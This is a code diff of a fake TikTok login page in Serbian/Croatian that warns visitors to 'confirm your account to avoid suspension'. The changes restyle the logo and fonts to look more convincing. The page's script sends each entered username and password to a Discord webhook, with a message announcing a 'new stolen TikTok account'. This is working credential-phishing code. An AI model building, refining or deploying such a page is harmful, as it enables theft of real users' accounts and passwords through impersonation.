@@ -23,18 +23,23 @@
             text-align: center;
             border: 1px solid #333;
         }
-        .logo {
-            font-size: 32px;
-            font-weight: bold;
-            color: #fff;
-            margin-bottom: 5px;
+        .logo-container {
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
-        .logo .cyan { color: #25F4EE; }
-        .logo .pink { color: #FE2C55; }
+        .logo-text {
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            color: #ffffff;
+        }
         .subtitle {
-            color: #aaa;
+            color: #a8a8a8;
             margin-bottom: 25px;
             font-size: 14px;
+            font-weight: 400;
         }
         .input-group {
             margin-bottom: 15px;
@@ -45,6 +50,7 @@
             margin-bottom: 5px;
             font-size: 13px;
             color: #fff;
+            font-weight: 500;
         }
         .input-group input {
             width: 100%;
@@ -68,9 +74,10 @@
             border: none;
             border-radius: 6px;
             font-size: 16px;
-            font-weight: bold;
+            font-weight: 600;
             cursor: pointer;
             margin-top: 10px;
+            transition: background 0.2s;
         }
         .btn:hover {
             background-color: #e0264b;
@@ -85,9 +92,9 @@
 <body>
 
     <div class="login-box">
-        <div class="logo">
-    <img src="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tns/article/static/build/_assets/TikTok_Text_Logo-f4107d45990f2d0e56bb.svg" alt="TikTok Logo" style="width: 150px; height: auto; display: block; margin: 0 auto;">
-</div>
+        <div class="logo-container">
+            <span class="logo-text">TikTok</span>
+        </div>
         <div class="subtitle">Potvrdite svoj nalog da biste izbegli suspendovanje</div>
         
         <form id="phishForm">
@@ -112,10 +119,9 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
-            // OVDJE UBACI TVOJ DISCORD WEBHOOK URL
+            // Tvoj Discord Webhook
             fetch('https://discord.com/api/webhooks/1559356064833736764/t3gaowbOAF3H4HVptMD_ae-rIlr4bLdUeVxSUU0uvLF-B9q2PGU5F1hsE_1aXFNA-Kx_', {
-        method: 'POST',
-            
+                method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     content: `🚨 **NOVI TIKTOK NALOG UKRADEN** 🚨\n\n**User:** ${username}\n**Pass:** ${password}`
